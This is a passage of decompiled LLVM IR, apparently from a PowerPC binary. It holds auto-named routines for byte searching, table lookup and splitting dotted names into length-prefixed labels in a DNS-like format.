  uselistorder i32 %v0_1000cf58, { 0, 3, 2, 1, 4 }
  uselistorder i32 -2, { 10, 11, 12, 1, 0, 2, 9, 3, 4, 13, 14, 5, 15, 16, 17, 6, 19, 20, 18, 21, 7, 8 }
  uselistorder i32 31, { 28, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 29, 30, 1, 2, 24, 25, 31, 32, 33, 7, 8, 3, 4, 0, 5, 9, 10, 11, 12, 13, 34, 35, 36, 51, 52, 49, 50, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 27, 6, 26 }
  uselistorder i32 140, { 1, 0 }
  uselistorder label %dec_label_pc_1000cf98, { 1, 0 }
}

define i32 @function_1000cfac(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000cfac:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000cfc4 = call i32 @__asm_mfcr()
  %v1_1000cfc8 = and i32 %v0_1000cfc4, 268435456
  %v3_1000cfc8 = icmp eq i32 %v1_1000cfc8, 0
  store i32 %v0_1000cfc4, i32* %r31.global-to-local, align 4
  br i1 %v3_1000cfc8, label %dec_label_pc_1000cfe0, label %dec_label_pc_1000cfd4

dec_label_pc_1000cfd4:                            ; preds = %dec_label_pc_1000cfac
  %v0_1000cfd4 = call i32 @function_10004e38()
  %v0_1000cfd8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000cfd8 = inttoptr i32 %v0_1000cfd4 to i32*
  store i32 %v0_1000cfd8, i32* %v2_1000cfd8, align 4
  br label %dec_label_pc_1000cfe0

dec_label_pc_1000cfe0:                            ; preds = %dec_label_pc_1000cfac, %dec_label_pc_1000cfd4
  %v0_1000cff0 = phi i32 [ %v0_1000cfc4, %dec_label_pc_1000cfac ], [ -1, %dec_label_pc_1000cfd4 ]
  ret i32 %v0_1000cff0

; uselistorder directives
  uselistorder i32 ()* @function_10004e38, { 35, 28, 45, 67, 66, 65, 44, 34, 27, 26, 43, 19, 18, 42, 25, 24, 57, 17, 16, 56, 14, 51, 13, 12, 11, 10, 9, 55, 8, 7, 5, 37, 6, 50, 49, 48, 47, 64, 63, 62, 30, 41, 4, 3, 23, 0, 22, 1, 33, 32, 54, 53, 52, 15, 46, 36, 21, 40, 20, 39, 38, 29, 31, 2, 61, 60, 59, 58 }
  uselistorder i32 268435456, { 10, 13, 7, 16, 2, 17, 3, 19, 5, 20, 21, 22, 23, 24, 4, 25, 26, 27, 8, 18, 6, 9, 14, 0, 15, 1, 12, 11, 28 }
  uselistorder label %dec_label_pc_1000cfe0, { 1, 0 }
}

define i32 @function_1000cff4(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000cff4:
  %v1_1000cff4 = add i32 %arg1, 128
  %v1_1000cff8 = mul i32 %arg1, 2
  %v2_1000cffc = icmp ugt i32 %v1_1000cff4, 383
  %v0_1000d000 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1000cffc, i32 %v0_1000d000)
  %v3_1000d008 = load i32, i32* bitcast (i32** @global_var_10010454.257 to i32*), align 4
  %v2_1000d00c = add i32 %v1_1000cff8, %v3_1000d008
  %v3_1000d00c = inttoptr i32 %v2_1000d00c to i16*
  %v4_1000d00c = load i16, i16* %v3_1000d00c, align 2
  %v5_1000d00c = sext i16 %v4_1000d00c to i32
  ret i32 %v5_1000d00c

; uselistorder directives
  uselistorder i32 128, { 8, 0, 1, 19, 20, 3, 4, 10, 11, 9, 12, 13, 14, 5, 15, 16, 17, 2, 6, 7, 18 }
}

define i32 @function_1000d014(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000d014:
  %r4.global-to-local = alloca i32, align 4
  %v1_1000d014 = urem i32 %arg1, 256
  store i32 %v1_1000d014, i32* %r4.global-to-local, align 4
  %v0_1000d0342 = load i32, i32* @r3, align 4
  %v1_1000d0343 = urem i32 %v0_1000d0342, 4
  %v3_1000d0345 = icmp eq i32 %v1_1000d0343, 0
  br i1 %v3_1000d0345, label %dec_label_pc_1000d03c, label %dec_label_pc_1000d01c

dec_label_pc_1000d01c:                            ; preds = %dec_label_pc_1000d014, %dec_label_pc_1000d030
  %v1_1000d020 = phi i32 [ %v0_1000d03c.pre, %dec_label_pc_1000d030 ], [ %v1_1000d014, %dec_label_pc_1000d014 ]
  %v0_1000d01c = phi i32 [ %v1_1000d030, %dec_label_pc_1000d030 ], [ %v0_1000d0342, %dec_label_pc_1000d014 ]
  %v1_1000d01c = inttoptr i32 %v0_1000d01c to i8*
  %v2_1000d01c = load i8, i8* %v1_1000d01c, align 1
  %v3_1000d01c = zext i8 %v2_1000d01c to i32
  %v4_1000d020 = icmp eq i32 %v3_1000d01c, %v1_1000d020
  %v3_1000d024 = icmp eq i8 %v2_1000d01c, 0
  %v0_1000d028 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000d020, i32 %v0_1000d028)
  br i1 %v3_1000d024, label %dec_label_pc_1000d10c, label %dec_label_pc_1000d030

dec_label_pc_1000d030:                            ; preds = %dec_label_pc_1000d01c
  %v0_1000d030 = load i32, i32* @r3, align 4
  %v1_1000d030 = add i32 %v0_1000d030, 1
  store i32 %v1_1000d030, i32* @r3, align 4
  %v1_1000d034 = urem i32 %v1_1000d030, 4
  %v3_1000d034 = icmp eq i32 %v1_1000d034, 0
  %v0_1000d03c.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_1000d034, label %dec_label_pc_1000d03c, label %dec_label_pc_1000d01c

dec_label_pc_1000d03c:                            ; preds = %dec_label_pc_1000d030, %dec_label_pc_1000d014
  %v0_1000d05410 = phi i32 [ %v0_1000d0342, %dec_label_pc_1000d014 ], [ %v1_1000d030, %dec_label_pc_1000d030 ]
  %v0_1000d03c = phi i32 [ %v1_1000d014, %dec_label_pc_1000d014 ], [ %v0_1000d03c.pre, %dec_label_pc_1000d030 ]
  %v1_1000d03c = mul i32 %v0_1000d03c, 256
  %v2_1000d044 = or i32 %v1_1000d03c, %v0_1000d03c
  %v1_1000d04c = mul i32 %v2_1000d044, 65536
  %v2_1000d050 = or i32 %v1_1000d04c, %v2_1000d044
  br label %dec_label_pc_1000d054

dec_label_pc_1000d054:                            ; preds = %dec_label_pc_1000d054, %dec_label_pc_1000d108, %dec_label_pc_1000d03c
  %v0_1000d0ac = phi i32 [ %v0_1000d05410, %dec_label_pc_1000d03c ], [ %v1_1000d058, %dec_label_pc_1000d108 ], [ %v1_1000d058, %dec_label_pc_1000d054 ]
  %v1_1000d054 = inttoptr i32 %v0_1000d0ac to i32*
  %v2_1000d054 = load i32, i32* %v1_1000d054, align 4
  %v1_1000d058 = add i32 %v0_1000d0ac, 4
  %v2_1000d060 = xor i32 %v2_1000d054, %v2_1000d050
  %v1_1000d064 = add i32 %v2_1000d054, 2130640639
  %v2_1000d06c = xor i32 %v1_1000d064, %v2_1000d054
  %v1_1000d070 = add i32 %v2_1000d060, 2130640639
  %v2_1000d074 = and i32 %v2_1000d06c, -2130640640
  %v3_1000d074 = xor i32 %v2_1000d074, -2130640640
  %v2_1000d078 = xor i32 %v1_1000d070, %v2_1000d060
  %v2_1000d07c = and i32 %v2_1000d078, -2130640640
  %v3_1000d07c = xor i32 %v2_1000d07c, -2130640640
  %v1_1000d088 = add i32 %v0_1000d0ac, 1
  %tmp = or i32 %v3_1000d07c, %v3_1000d074
  %brmerge = icmp eq i32 %tmp, 0
  br i1 %brmerge, label %dec_label_pc_1000d054, label %dec_label_pc_1000d094

dec_label_pc_1000d094:                            ; preds = %dec_label_pc_1000d054
  %v2_1000d094 = inttoptr i32 %v0_1000d0ac to i8*
  %v3_1000d094 = load i8, i8* %v2_1000d094, align 1
  %v4_1000d094 = zext i8 %v3_1000d094 to i32
  %v1_1000d098 = add i32 %v0_1000d0ac, 2
  %v1_1000d09c = add i32 %v0_1000d0ac, 3
  %v4_1000d0a0 = icmp eq i32 %v4_1000d094, %v0_1000d03c
  br i1 %v4_1000d0a0, label %dec_label_pc_1000d0ac, label %dec_label_pc_1000d0b4

dec_label_pc_1000d0ac:                            ; preds = %dec_label_pc_1000d094
  ret i32 %v0_1000d0ac

dec_label_pc_1000d0b4:                            ; preds = %dec_label_pc_1000d094
  %v3_1000d0a4 = icmp eq i8 %v3_1000d094, 0
  br i1 %v3_1000d0a4, label %dec_label_pc_1000d10c, label %dec_label_pc_1000d0b8

dec_label_pc_1000d0b8:                            ; preds = %dec_label_pc_1000d0b4
  %v2_1000d0b8 = inttoptr i32 %v1_1000d088 to i8*
  %v3_1000d0b8 = load i8, i8* %v2_1000d0b8, align 1
  %v4_1000d0b8 = zext i8 %v3_1000d0b8 to i32
  %v4_1000d0bc = icmp eq i32 %v4_1000d0b8, %v0_1000d03c
  br i1 %v4_1000d0bc, label %dec_label_pc_1000d0c8, label %dec_label_pc_1000d0d0

dec_label_pc_1000d0c8:                            ; preds = %dec_label_pc_1000d0b8
  ret i32 %v1_1000d088

dec_label_pc_1000d0d0:                            ; preds = %dec_label_pc_1000d0b8
  %v3_1000d0c0 = icmp eq i8 %v3_1000d0b8, 0
  br i1 %v3_1000d0c0, label %dec_label_pc_1000d10c, label %dec_label_pc_1000d0d4

dec_label_pc_1000d0d4:                            ; preds = %dec_label_pc_1000d0d0
  %v2_1000d0d4 = inttoptr i32 %v1_1000d098 to i8*
  %v3_1000d0d4 = load i8, i8* %v2_1000d0d4, align 1
  %v4_1000d0d4 = zext i8 %v3_1000d0d4 to i32
  %v4_1000d0d8 = icmp eq i32 %v4_1000d0d4, %v0_1000d03c
  br i1 %v4_1000d0d8, label %dec_label_pc_1000d0e4, label %dec_label_pc_1000d0ec

dec_label_pc_1000d0e4:                            ; preds = %dec_label_pc_1000d0d4
  ret i32 %v1_1000d098

dec_label_pc_1000d0ec:                            ; preds = %dec_label_pc_1000d0d4
  %v3_1000d0dc = icmp eq i8 %v3_1000d0d4, 0
  br i1 %v3_1000d0dc, label %dec_label_pc_1000d10c, label %dec_label_pc_1000d0f0

dec_label_pc_1000d0f0:                            ; preds = %dec_label_pc_1000d0ec
  %v2_1000d0f0 = inttoptr i32 %v1_1000d09c to i8*
  %v3_1000d0f0 = load i8, i8* %v2_1000d0f0, align 1
  %v4_1000d0f0 = zext i8 %v3_1000d0f0 to i32
  %v4_1000d0f4 = icmp eq i32 %v4_1000d0f0, %v0_1000d03c
  br i1 %v4_1000d0f4, label %dec_label_pc_1000d100, label %dec_label_pc_1000d108

dec_label_pc_1000d100:                            ; preds = %dec_label_pc_1000d0f0
  ret i32 %v1_1000d09c

dec_label_pc_1000d108:                            ; preds = %dec_label_pc_1000d0f0
  %v3_1000d0f8 = icmp eq i8 %v3_1000d0f0, 0
  br i1 %v3_1000d0f8, label %dec_label_pc_1000d10c, label %dec_label_pc_1000d054

dec_label_pc_1000d10c:                            ; preds = %dec_label_pc_1000d01c, %dec_label_pc_1000d108, %dec_label_pc_1000d0ec, %dec_label_pc_1000d0d0, %dec_label_pc_1000d0b4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1000d058, { 1, 0 }
  uselistorder i32 %v2_1000d054, { 0, 2, 1 }
  uselistorder i32 %v0_1000d0ac, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v2_1000d044, { 1, 0 }
  uselistorder i32 %v0_1000d03c, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1000d030, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1000d0342, { 2, 1, 0 }
  uselistorder i32 %v1_1000d014, { 1, 2, 0 }
  uselistorder i32 3, { 1, 37, 38, 39, 40, 41, 42, 43, 44, 45, 2, 54, 3, 0, 10, 18, 27, 63, 30, 20, 19, 12, 21, 46, 11, 47, 4, 48, 49, 55, 56, 22, 57, 58, 16, 15, 5, 14, 28, 29, 52, 53, 17, 36, 6, 7, 50, 8, 9, 59, 60, 68, 69, 70, 64, 65, 66, 67, 13, 62, 61, 51, 23, 31, 32, 24, 33, 34, 25, 35, 26 }
  uselistorder i32 -2130640640, { 3, 4, 5, 6, 0, 7, 2, 9, 1, 8 }
  uselistorder i32 65536, { 0, 1, 21, 2, 3, 4, 5, 7, 6, 8, 9, 22, 10, 11, 12, 14, 13, 15, 16, 19, 17, 20, 18 }
  uselistorder i32 4, { 169, 5, 6, 7, 91, 108, 8, 9, 172, 170, 171, 117, 173, 174, 175, 102, 10, 176, 177, 178, 179, 180, 181, 182, 11, 183, 12, 13, 14, 109, 184, 185, 118, 186, 187, 188, 15, 16, 103, 139, 17, 18, 233, 234, 235, 236, 237, 238, 206, 119, 19, 20, 271, 272, 120, 21, 22, 96, 23, 24, 25, 26, 27, 28, 189, 190, 121, 29, 30, 2, 31, 0, 239, 3, 32, 1, 191, 122, 33, 207, 208, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 273, 252, 97, 287, 294, 34, 35, 36, 37, 38, 274, 275, 39, 276, 40, 277, 41, 42, 133, 43, 44, 134, 45, 151, 152, 153, 215, 216, 217, 46, 135, 47, 48, 49, 136, 50, 137, 138, 220, 222, 221, 218, 219, 140, 141, 142, 143, 223, 224, 225, 226, 227, 228, 229, 230, 231, 116, 192, 123, 193, 194, 98, 51, 52, 195, 53, 196, 197, 198, 199, 200, 201, 104, 54, 202, 278, 279, 253, 55, 56, 57, 105, 58, 114, 59, 106, 107, 60, 113, 254, 61, 62, 288, 289, 290, 124, 291, 292, 293, 63, 280, 281, 282, 94, 95, 283, 284, 125, 285, 286, 64, 203, 65, 66, 67, 68, 69, 70, 71, 255, 72, 256, 257, 110, 258, 259, 260, 261, 262, 73, 74, 263, 264, 111, 265, 266, 112, 267, 268, 270, 75, 76, 92, 93, 269, 209, 77, 210, 126, 211, 145, 146, 147, 115, 4, 148, 149, 150, 212, 213, 127, 78, 79, 144, 80, 81, 82, 83, 84, 99, 85, 86, 154, 155, 128, 156, 157, 158, 129, 159, 87, 160, 161, 162, 130, 163, 164, 165, 166, 167, 168, 204, 131, 205, 100, 88, 214, 101, 89, 232, 90, 132 }
  uselistorder i32 256, { 0, 1, 2, 3, 4, 5, 45, 51, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 44, 18, 19, 20, 21, 22, 23, 24, 25, 55, 26, 56, 57, 58, 27, 28, 29, 30, 31, 52, 46, 32, 33, 53, 34, 35, 54, 36, 37, 38, 39, 40, 41, 42, 43, 47, 48, 49, 50 }
  uselistorder label %dec_label_pc_1000d10c, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1000d054, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000d01c, { 1, 0 }
}

define i32 @function_1000d114(i8* %arg1) local_unnamed_addr {
dec_label_pc_1000d114:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_1000d118 = load i32, i32* @lr, align 4
  store i32 %v0_1000d118, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_1000d124 = load i32, i32* @r4, align 4
  store i32 %v0_1000d124, i32* @r29, align 4
  %v0_1000d128 = load i32, i32* @r5, align 4
  store i32 %v0_1000d128, i32* %r27.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  %v3_1000d19413 = icmp eq i8* %arg1, null
  store i32 %tmp, i32* @r3, align 4
  br i1 %v3_1000d19413, label %dec_label_pc_1000d1b0, label %dec_label_pc_1000d1a4

dec_label_pc_1000d138:                            ; preds = %dec_label_pc_1000d1a4
  store i32 268489020, i32* @lr, align 4
  %v3_1000d138 = call i32 @function_1000d014(i32 %v0_1000d1a414, i32 46)
  store i32 %v3_1000d138, i32* @r30, align 4
  %v3_1000d13c = icmp eq i32 %v3_1000d138, 0
  %v0_1000d140 = load i32, i32* @r31, align 4
  store i32 %v0_1000d140, i32* @r3, align 4
  %v2_1000d144 = sub i32 %v3_1000d138, %v0_1000d140
  store i32 %v2_1000d144, i32* %r0.global-to-local, align 4
  br i1 %v3_1000d13c, label %dec_label_pc_1000d14c, label %dec_label_pc_1000d154

dec_label_pc_1000d14c:                            ; preds = %dec_label_pc_1000d138
  %v0_1000d14c = call i32 @function_10007288()
  store i32 %v0_1000d14c, i32* %r3.global-to-local, align 4
  %sext = mul i32 %v0_1000d14c, 16777216
  %v1_1000d150 = sdiv i32 %sext, 16777216
  store i32 %v1_1000d150, i32* %r0.global-to-local, align 4
  %v0_1000d164.pre = load i32, i32* @r31, align 4
  %v0_1000d174.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000d154

dec_label_pc_1000d154:                            ; preds = %dec_label_pc_1000d138, %dec_label_pc_1000d14c
  %v0_1000d174 = phi i32 [ %v3_1000d138, %dec_label_pc_1000d138 ], [ %v0_1000d174.pre, %dec_label_pc_1000d14c ]
  %v0_1000d164 = phi i32 [ %v0_1000d140, %dec_label_pc_1000d138 ], [ %v0_1000d164.pre, %dec_label_pc_1000d14c ]
  %v0_1000d180 = phi i32 [ %v2_1000d144, %dec_label_pc_1000d138 ], [ %v1_1000d150, %dec_label_pc_1000d14c ]
  %v0_1000d158 = load i32, i32* @r28, align 4
  %v1_1000d158 = load i32, i32* %r27.global-to-local, align 4
  %v2_1000d158 = sub i32 %v1_1000d158, %v0_1000d158
  %v1_1000d15c = add i32 %v0_1000d158, 1
  store i32 %v1_1000d15c, i32* %r11.global-to-local, align 4
  %v1_1000d160 = add i32 %v2_1000d158, -1
  store i32 %v0_1000d164, i32* @r4, align 4
  %v0_1000d168 = load i32, i32* @r29, align 4
  %v2_1000d168 = add i32 %v0_1000d168, %v1_1000d15c
  store i32 %v2_1000d168, i32* @r3, align 4
  store i32 %v0_1000d180, i32* @r5, align 4
  %v2_1000d170 = icmp ult i32 %v0_1000d180, %v1_1000d160
  %v1_1000d174 = add i32 %v0_1000d174, 1
  store i32 %v1_1000d174, i32* @r31, align 4
  %v3_1000d154.not = icmp ne i32 %v0_1000d180, 0
  %or.cond = and i1 %v2_1000d170, %v3_1000d154.not
  br i1 %or.cond, label %dec_label_pc_1000d180, label %dec_label_pc_1000d1c8

dec_label_pc_1000d180:                            ; preds = %dec_label_pc_1000d154
  %v3_1000d180 = trunc i32 %v0_1000d180 to i8
  %v4_1000d180 = add i32 %v0_1000d168, %v0_1000d158
  %v5_1000d180 = inttoptr i32 %v4_1000d180 to i8*
  store i8 %v3_1000d180, i8* %v5_1000d180, align 1
  %v0_1000d184 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d184 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000d184 = add i32 %v1_1000d184, %v0_1000d184
  store i32 %v2_1000d184, i32* @r28, align 4
  store i32 268489100, i32* @lr, align 4
  %v0_1000d188 = call i32 @function_10007108()
  store i32 %v0_1000d188, i32* %r3.global-to-local, align 4
  %v0_1000d18c = load i32, i32* @r30, align 4
  %v3_1000d18c = icmp eq i32 %v0_1000d18c, 0
  br i1 %v3_1000d18c, label %dec_label_pc_1000d1b0, label %dec_label_pc_1000d180.dec_label_pc_1000d194_crit_edge

dec_label_pc_1000d180.dec_label_pc_1000d194_crit_edge: ; preds = %dec_label_pc_1000d180
  %v0_1000d194.pre = load i32, i32* @r31, align 4
  %v3_1000d194 = icmp eq i32 %v0_1000d194.pre, 0
  store i32 %v0_1000d194.pre, i32* @r3, align 4
  br i1 %v3_1000d194, label %dec_label_pc_1000d1b0, label %dec_label_pc_1000d1a4

dec_label_pc_1000d1a4:                            ; preds = %dec_label_pc_1000d114, %dec_label_pc_1000d180.dec_label_pc_1000d194_crit_edge
  %v0_1000d1a414 = phi i32 [ %v0_1000d194.pre, %dec_label_pc_1000d180.dec_label_pc_1000d194_crit_edge ], [ %tmp, %dec_label_pc_1000d114 ]
  %v1_1000d1a4 = inttoptr i32 %v0_1000d1a414 to i8*
  %v2_1000d1a4 = load i8, i8* %v1_1000d1a4, align 1
  %v3_1000d1a4 = zext i8 %v2_1000d1a4 to i32
  store i32 %v3_1000d1a4, i32* %r0.global-to-local, align 4
  %v3_1000d1a8 = icmp eq i8 %v2_1000d1a4, 0
  br i1 %v3_1000d1a8, label %dec_label_pc_1000d1b0, label %dec_label_pc_1000d138

dec_label_pc_1000d1b0:                            ; preds = %dec_label_pc_1000d180.dec_label_pc_1000d194_crit_edge, %dec_label_pc_1000d180, %dec_label_pc_1000d1a4, %dec_label_pc_1000d114
  %v0_1000d1b0 = load i32, i32* %r27.global-to-local, align 4
  %tmp10 = icmp slt i32 %v0_1000d1b0, 1
  br i1 %tmp10, label %dec_label_pc_1000d1c8, label %dec_label_pc_1000d1b8

dec_label_pc_1000d1b8:                            ; preds = %dec_label_pc_1000d1b0
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1000d1bc = load i32, i32* @r28, align 4
  %v1_1000d1bc = add i32 %v0_1000d1bc, 1
  store i32 %v1_1000d1bc, i32* %r3.global-to-local, align 4
  %v1_1000d1c0 = load i32, i32* @r29, align 4
  %v4_1000d1c0 = add i32 %v1_1000d1c0, %v0_1000d1bc
  %v5_1000d1c0 = inttoptr i32 %v4_1000d1c0 to i8*
  store i8 0, i8* %v5_1000d1c0, align 1
  %v0_1000d1dc.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000d1cc

dec_label_pc_1000d1c8:                            ; preds = %dec_label_pc_1000d154, %dec_label_pc_1000d1b0
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000d1cc

dec_label_pc_1000d1cc:                            ; preds = %dec_label_pc_1000d1b8, %dec_label_pc_1000d1c8
  %v0_1000d1dc = phi i32 [ %v0_1000d1dc.pre, %dec_label_pc_1000d1b8 ], [ -1, %dec_label_pc_1000d1c8 ]
  store i32 %v0_1000d118, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000d1dc

; uselistorder directives
  uselistorder i32 %v0_1000d1a414, { 1, 0 }
  uselistorder i32 %v0_1000d194.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1000d180, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1000d150, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 4, 5, 0 }
  uselistorder i32* %r27.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 5, 3, 2, 4, 6 }
  uselistorder i32 16777216, { 1, 0, 2 }
  uselistorder i32 ()* @function_10007288, { 12, 41, 40, 20, 21, 13, 9, 10, 39, 19, 1, 18, 2, 38, 37, 36, 35, 3, 34, 7, 6, 33, 32, 31, 5, 4, 30, 29, 28, 27, 8, 26, 25, 24, 23, 22, 17, 0, 16, 14, 15, 11 }
  uselistorder i32 (i32, i32)* @function_1000d014, { 0, 2, 1 }
  uselistorder i32 46, { 0, 3, 1, 4, 5, 2 }
  uselistorder label %dec_label_pc_1000d1cc, { 1, 0 }
  uselistorder label %dec_label_pc_1000d1c8, { 1, 0 }
  uselistorder label %dec_label_pc_1000d1b0, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1000d1a4, { 1, 0 }
  uselistorder label %dec_label_pc_1000d154, { 1, 0 }
}

define i32 @function_1000d1e0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000d1e0:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %v0_1000d1e4 = call i32 @__asm_mfcr()
  store i32 %v0_1000d1e4, i32* @r26, align 4
  %v3_1000d1f0 = icmp eq i32 %v0_1000d1e4, 0
  store i32 %arg2, i32* @r25, align 4
  %v0_1000d200 = load i32, i32* @r6, align 4
  store i32 %v0_1000d200, i32* @r24, align 4
  br i1 %v3_1000d1f0, label %dec_label_pc_1000d2b8, label %dec_label_pc_1000d208

dec_label_pc_1000d208:                            ; preds = %dec_label_pc_1000d1e0
  store i32 1, i32* @r23, align 4
  store i32 0, i32* %r27.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_1000d29414 = load i32, i32* @r4, align 4
  %v2_1000d29415 = add i32 %v1_1000d29414, %v0_1000d1e4
  %v3_1000d29416 = inttoptr i32 %v2_1000d29415 to i8*
  %v4_1000d29417 = load i8, i8* %v3_1000d29416, align 1
  %v5_1000d29418 = zext i8 %v4_1000d29417 to i32
  store i32 %v5_1000d29418, i32* @r31, align 4
  store i1 false, i1* %cr4_eq.global-to-local, align 1
  %v3_1000d29c20 = icmp eq i8 %v4_1000d29417, 0
  br i1 %v3_1000d29c20, label %dec_label_pc_1000d2a8, label %dec_label_pc_1000d218

dec_label_pc_1000d218:                            ; preds = %dec_label_pc_1000d208, %dec_label_pc_1000d290
  %v3_1000d29822 = phi i1 [ %v3_1000d298, %dec_label_pc_1000d290 ], [ false, %dec_label_pc_1000d208 ]
  %v5_1000d29421 = phi i32 [ %v5_1000d294, %dec_label_pc_1000d290 ], [ %v5_1000d29418, %dec_label_pc_1000d208 ]
  br i1 %v3_1000d29822, label %dec_label_pc_1000d220, label %dec_label_pc_1000d21c

dec_label_pc_1000d21c:                            ; preds = %dec_label_pc_1000d218
  %v0_1000d21c = load i32, i32* %r27.global-to-local, align 4
  %v1_1000d21c = add i32 %v0_1000d21c, 1
  store i32 %v1_1000d21c, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1000d220

dec_label_pc_1000d220:                            ; preds = %dec_label_pc_1000d218, %dec_label_pc_1000d21c
  %v1_1000d220 = call i32 @__asm_rlwinm(i32 %v5_1000d29421, i32 0, i32 24, i32 25)
  %v0_1000d224 = load i32, i32* @r4, align 4
  %v1_1000d224 = add i32 %v0_1000d224, 1
  store i32 %v1_1000d224, i32* @r30, align 4
  %v3_1000d228 = icmp eq i32 %v1_1000d220, 192
  br i1 %v3_1000d228, label %dec_label_pc_1000d230, label %dec_label_pc_1000d250

dec_label_pc_1000d230:                            ; preds = %dec_label_pc_1000d220
  %v0_1000d230 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_1000d230, label %dec_label_pc_1000d238, label %dec_label_pc_1000d234

dec_label_pc_1000d234:                            ; preds = %dec_label_pc_1000d230
  %v0_1000d234 = load i32, i32* %r27.global-to-local, align 4
  %v1_1000d234 = add i32 %v0_1000d234, 1
  store i32 %v1_1000d234, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1000d238

dec_label_pc_1000d238:                            ; preds = %dec_label_pc_1000d230, %dec_label_pc_1000d234
  %v0_1000d238 = load i32, i32* @r26, align 4
  %v2_1000d238 = add i32 %v0_1000d238, %v1_1000d224
  %v3_1000d238 = inttoptr i32 %v2_1000d238 to i8*
  %v4_1000d238 = load i8, i8* %v3_1000d238, align 1
  %v5_1000d238 = zext i8 %v4_1000d238 to i32
  %v1_1000d23c = call i32 @__asm_rlwinm(i32 %v5_1000d29421, i32 8, i32 18, i32 23)
  %v0_1000d240 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000d240, i32* @r28, align 4
  store i32 0, i32* @r23, align 4
  %v2_1000d248 = or i32 %v5_1000d238, %v1_1000d23c
  store i32 %v2_1000d248, i32* @r4, align 4
  br label %dec_label_pc_1000d290

dec_label_pc_1000d250:                            ; preds = %dec_label_pc_1000d220
  %v0_1000d250 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000d250 = add i32 %v0_1000d250, %v5_1000d29421
  store i32 %v2_1000d250, i32* @r29, align 4
  %v1_1000d254 = add i32 %v2_1000d250, 1
  store i32 %v1_1000d254, i32* @r28, align 4
  %v1_1000d258 = load i32, i32* @r24, align 4
  %v2_1000d258 = icmp ult i32 %v1_1000d254, %v1_1000d258
  br i1 %v2_1000d258, label %dec_label_pc_1000d260, label %dec_label_pc_1000d2b8

dec_label_pc_1000d260:                            ; preds = %dec_label_pc_1000d250
  %v0_1000d260 = load i32, i32* @r26, align 4
  %v2_1000d260 = add i32 %v0_1000d260, %v1_1000d224
  store i32 %v2_1000d260, i32* @r4, align 4
  %v0_1000d264 = load i32, i32* @r25, align 4
  %v2_1000d264 = add i32 %v0_1000d264, %v0_1000d250
  store i32 %v2_1000d264, i32* @r3, align 4
  store i32 %v5_1000d29421, i32* @r5, align 4
  store i32 268489328, i32* @lr, align 4
  %v0_1000d26c = call i32 @function_10007108()
  %v0_1000d270 = load i32, i32* @r30, align 4
  %v2_1000d270 = add i32 %v0_1000d270, %v5_1000d29421
  store i32 %v2_1000d270, i32* @r4, align 4
  %v0_1000d274 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_1000d274, label %dec_label_pc_1000d27c, label %dec_label_pc_1000d278

dec_label_pc_1000d278:                            ; preds = %dec_label_pc_1000d260
  %v0_1000d278 = load i32, i32* %r27.global-to-local, align 4
  %v2_1000d278 = add i32 %v0_1000d278, %v5_1000d29421
  store i32 %v2_1000d278, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1000d27c

dec_label_pc_1000d27c:                            ; preds = %dec_label_pc_1000d260, %dec_label_pc_1000d278
  %v0_1000d27c = load i32, i32* @r26, align 4
  %v2_1000d27c = add i32 %v0_1000d27c, %v2_1000d270
  %v3_1000d27c = inttoptr i32 %v2_1000d27c to i8*
  %v4_1000d27c = load i8, i8* %v3_1000d27c, align 1
  %v3_1000d280 = icmp eq i8 %v4_1000d27c, 0
  br i1 %v3_1000d280, label %dec_label_pc_1000d28c, label %dec_label_pc_1000d288

dec_label_pc_1000d288:                            ; preds = %dec_label_pc_1000d27c
  br label %dec_label_pc_1000d28c

dec_label_pc_1000d28c:                            ; preds = %dec_label_pc_1000d27c, %dec_label_pc_1000d288
